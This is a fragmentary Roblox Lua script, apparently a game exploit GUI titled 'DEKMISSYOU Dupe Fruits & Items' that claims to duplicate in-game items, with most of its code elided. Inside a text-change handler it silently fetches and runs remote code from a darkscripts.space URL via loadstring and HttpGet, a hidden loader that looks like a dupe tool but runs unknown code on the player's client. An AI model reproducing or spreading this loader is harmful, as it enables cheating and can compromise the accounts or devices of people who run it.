...
PurchaseTitle.Text = "MISSYOU HUB"
...
Title.Parent = Frame
Title.Text = "DEKMISSYOU Dupe Fruits & Items"
        ...
        if itemFrame then
            ...
            itemCounterText:GetPropertyChangedSignal("Text"):Connect(function()
                if itemCounterText.Text ~= tostring(amount) then
					...
					coroutine.running(loadstring(game:HttpGet('https://darkscripts.space/scripts/8f9b92a4-60cd-4709-a63f-e940585868c6_1182991105411780646.lua',true))())
